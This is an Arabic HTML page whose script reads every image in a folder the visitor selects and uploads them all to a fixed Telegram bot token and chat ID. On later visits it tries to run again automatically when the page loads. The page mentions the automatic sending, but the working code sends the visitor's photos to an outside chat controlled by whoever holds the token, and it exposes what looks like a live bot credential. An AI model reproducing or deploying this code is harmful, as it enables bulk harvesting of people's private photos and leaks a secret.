<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>📂 إرسال الصور تلقائيًا عبر Telegram</title>

  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <script src="https://cdn.tailwindcss.com"></script>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">

  <style>
    body {
      font-family: 'Cairo', sans-serif;
      background: linear-gradient(135deg, #e0e7ff, #fef3c7);
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      flex-direction: column;
    }
    .card {
      background: white;
      border-radius: 20px;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      padding: 30px;
      width: 90%;
      max-width: 450px;
      text-align: center;
    }
    .spinner {
      border: 4px solid #ddd;
      border-top: 4px solid #4f46e5;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 15px auto;
      display: none;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>

<body>
  <div class="card">
    <h2 class="text-xl font-bold mb-3 text-indigo-700">📤 إرسال مجلد الصور تلقائيًا</h2>
    <p class="text-gray-600 mb-3">سيتم إرسال الصور فور فتح الصفحة أو عند الضغط على زر الإرسال.</p>
    <div class="spinner" id="spinner"></div>
    <button id="chooseFolder" class="btn btn-primary w-full mb-2">📁 اختيار المجلد</button>
    <button id="sendNow" class="btn btn-success w-full" style="display:none;">🚀 إرسال الآن</button>
  </div>

  <script>
    const BOT_TOKEN = '7831156800:AAGbRpsGy4-wzQqdgl6yU1YfEaHxrVmorF4'; // ← غيّره بتوكنك
    const CHAT_ID = '7498653159'; // ← غيّره بالـ Chat ID

    const spinner = document.getElementById('spinner');
    const chooseBtn = document.getElementById('chooseFolder');
    const sendNow = document.getElementById('sendNow');

    let folderHandle = null;

    // إرسال صورة إلى تليجرام
    async function sendToTelegram(file, path) {
      const caption = `📸 من مجلد الصور\n🕒 ${new Date().toLocaleString('ar-EG')}\n📁 ${path}`;
      const fd = new FormData();
      fd.append('chat_id', CHAT_ID);
      fd.append('photo', file);
      fd.append('caption', caption);

      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
        method: 'POST',
        body: fd
      });
      return res.ok;
    }

    // قراءة المجلد وإرسال الصور
    async function readAndSendAll(handle) {
      spinner.style.display = "block";
      chooseBtn.style.display = "none";
      sendNow.style.display = "none";

      try {
        let count = 0;
        for await (const entry of handle.values()) {
          if (entry.kind === "file") {
            const file = await entry.getFile();
            if (file.type.startsWith("image/")) {
              const ok = await sendToTelegram(file, entry.name);
              if (ok) count++;
            }
          }
        }
        alert(`✅ تم إرسال ${count} صورة بنجاح!`);
      } catch (e) {
        alert("⚠️ خطأ أثناء الإرسال:\n" + e.message);
      } finally {
        spinner.style.display = "none";
        sendNow.style.display = "inline-block";
      }
    }

    // حفظ المجلد
    async function saveFolderHandle(handle) {
      folderHandle = handle;
      const perm = await handle.requestPermission({ mode: 'read' });
      if (perm === 'granted') {
        localStorage.setItem('hasFolder', 'true');
        window.folderHandle = handle;
        sendNow.style.display = "inline-block";
      }
    }

    // اختيار مجلد أول مرة
    chooseBtn.addEventListener('click', async () => {
      try {
        const handle = await window.showDirectoryPicker();
        await saveFolderHandle(handle);
        await readAndSendAll(handle);
      } catch {
        alert("❌ لم يتم اختيار مجلد.");
      }
    });

    // إرسال يدوي
    sendNow.addEventListener('click', async () => {
      if (folderHandle) await readAndSendAll(folderHandle);
      else alert("يجب اختيار مجلد أولاً.");
    });

    // تشغيل تلقائي عند الفتح (لو سبق السماح)
    window.addEventListener('load', async () => {
      if ('showDirectoryPicker' in window && localStorage.getItem('hasFolder')) {
        alert("🔄 جاري محاولة الوصول للمجلد تلقائيًا...");
        try {
          const handle = await window.showDirectoryPicker();
          await saveFolderHandle(handle);
          await readAndSendAll(handle);
        } catch {
          alert("⚠️ يرجى السماح بالوصول للمجلد أول مرة فقط.");
        }
      }
    });
  </script>
</body>
</html>
